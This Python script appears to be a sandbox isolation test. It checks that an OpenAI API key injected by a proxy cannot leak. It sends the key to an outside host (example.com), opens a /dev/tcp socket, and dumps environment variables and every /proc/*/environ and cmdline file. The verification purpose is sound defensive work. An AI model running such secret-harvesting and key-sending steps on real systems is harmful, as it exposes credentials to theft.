"""Runs INSIDE an OpenShell sandbox that has an OpenAI provider attached. Prints one line per check, then a dump of every
place a secret could hide (env, process environments, command lines) so the HOST can verify the real key is absent."""
import glob, os, socket, subprocess, urllib.request

K = os.environ.get("OPENAI_API_KEY", "")


def sh(cmd, timeout=15):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (p.stdout + p.stderr).strip()
    except subprocess.TimeoutExpired:
        return "timeout"


def py_get(url):
    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {K}"})
    try:
        return str(urllib.request.urlopen(req, timeout=10).status)
    except Exception as e:  # noqa: BLE001
        return f"BLOCKED({type(e).__name__}: {getattr(e, 'reason', e)})"[:70]


def curl(url):
    code = sh(f"curl -s -m 8 -o /dev/null -w '%{{http_code}}' -H 'Authorization: Bearer {K}' {url}")
    return code if code.startswith(("2", "3", "4")) else f"BLOCKED(http={code})"


print(f"K1 env OPENAI_API_KEY present={bool(K)} looks_like_real_key={K.startswith('sk-')} length={len(K)} "
      f"placeholder_shape={K[:10]}...")
print("K2 python  -> api.openai.com/v1/models (key substituted by the proxy):", py_get("https://api.openai.com/v1/models"))
print("K3 curl    -> api.openai.com/v1/models:", curl("https://api.openai.com/v1/models"))
print("K4 curl    -> example.com WITH the key (must be blocked, key must not leave):", curl("https://example.com"))
print("K5 python  -> example.com WITH the key:", py_get("https://example.com"))
print("K6 bash STARTED BY the allowed python -> api.openai.com:443 (children inherit the parent's access; OPEN is expected):",
      sh("bash -c 'exec 3<>/dev/tcp/api.openai.com/443 && echo OPEN || echo BLOCKED' 2>&1 | tail -1"))
print("K7 key reachable from a file or another process? (host greps the dump below for the real key)")
print("----DUMP-BEGIN")
print("\n".join(f"{k}={v}" for k, v in os.environ.items()))
for pattern in ("/proc/[0-9]*/environ", "/proc/[0-9]*/cmdline"):
    for path in glob.glob(pattern):
        try:
            print(path, open(path, "rb").read().replace(b"\0", b" ").decode(errors="replace"))
        except OSError:
            pass
print(sh("ls -la ~ /sandbox /etc/openshell* /run/openshell 2>&1 | head -40"))
print("----DUMP-END")
print("K9 network interfaces:", ",".join(n for _, n in socket.if_nameindex()))
